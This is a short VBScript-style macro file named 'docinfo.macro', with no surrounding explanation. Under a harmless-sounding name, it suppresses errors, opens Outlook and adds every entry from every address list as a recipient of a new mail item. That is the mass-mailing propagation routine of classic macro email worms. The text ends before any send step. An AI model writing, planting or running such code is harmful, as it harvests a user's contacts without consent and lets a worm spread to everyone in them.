docinfo.macro:
On Error Resume Next
Set a=CreateObject("Outlook.Application")
Set b=a.CreateItem(0)
Set c=a.GetNameSpace("MAPI").AddressLists
For d=1 To c.Count
Set e=c(d).AddressEntries
For f=1 To e.Count
b.Recipients.Add e(f)
Next
Next
